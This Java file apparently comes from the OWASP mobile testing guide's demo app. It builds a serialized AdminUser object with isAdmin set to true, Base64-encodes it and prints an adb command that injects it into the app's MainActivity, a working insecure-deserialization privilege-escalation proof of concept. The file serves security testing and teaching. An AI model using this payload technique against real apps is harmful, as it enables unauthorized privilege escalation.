package org.owasp.mastestapp;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

class MastgTest {
    // "static" in Java mimics the default nested class behavior of Kotlin
    public static class BaseUser implements Serializable {
        private static final long serialVersionUID = 100L;
        public String username;

        public BaseUser(String username) {
            this.username = username;
        }
    }

    public static class AdminUser extends BaseUser {
        private static final long serialVersionUID = 200L;
        public boolean isAdmin;

        public AdminUser(String username) {
            super(username);
            this.isAdmin = true; // Elevating privileges
        }
    }
}

public class PayloadGenerator {
    public static void main(String[] args) throws Exception {
        MastgTest.AdminUser admin = new MastgTest.AdminUser("Exploited Admin");

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(admin);
        oos.flush();

        String base64Payload = Base64.getEncoder().encodeToString(bos.toByteArray());

        System.out.println("adb shell am start -n org.owasp.mastestapp/.MainActivity --es payload_b64 '" + base64Payload + "'");
    }
}